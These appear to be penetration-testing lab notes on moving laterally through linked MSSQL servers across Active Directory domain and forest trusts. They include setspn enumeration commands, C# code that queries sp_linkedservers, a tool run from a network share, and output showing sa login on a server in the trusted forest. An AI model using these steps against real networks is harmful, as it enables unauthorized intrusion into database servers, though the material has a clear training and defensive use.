#SQL servers themselves can also be linked across domain and even forest trust, which creates an interesting target opportunity

#we'll first perform enumeration to locate any registered SPNs for MSSQL in prod.corp1.com

setspn -T prod -Q MSSQLSvc/*

#We can enumerate registered SPNs across domain trust 

setspn -T corp1 -Q MSSQLSvc/*

#We can also do the enumeration accross forest trust and allows us to locate SPNs in corp2.com:

setspn -T corp2.com -Q MSSQLSvc/*

#First, we'll attempt to log in to rdc01.corp1.com, reusing our existing tradecraft by updating the target server as shown in the partial code shown below:

...
String sqlServer = "rdc01.corp1.com";
String database = "master";

String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);

String execCmd = "EXEC sp_linkedservers;";

SqlCommand command = new SqlCommand(execCmd, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
  Console.WriteLine("Linked SQL server: " + reader[0]);
}
reader.Close();
...

#Ex of output:

Auth success!
Linked SQL server: CDC01.PROD.CORP1.COM
Linked SQL server: DC01.CORP2.COM
Linked SQL server: RDC01\SQLEXPRESS

#The output shows that we have found a link to the MSSQL server in corp2.com. Now, we must determine the login context.
#We'll again rely on our previously developed tradecraft:

\\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe

#Ex of result
Auth success!
Executing as the login PROD\offsec on RDC01.CORP1.COM
Executing as the login sa on DC01.CORP2.COM

#By following the link, we have obtained sa login context. This grants us code execution on the MSSQL server inside the trusted forest. 

#Windows authentication to MSSQL is possible across both domain and forest trust and provides an attack surface that may break the security boundary.
#In addition, linked SQL servers provide another potential attack vector across both domain and forest trust.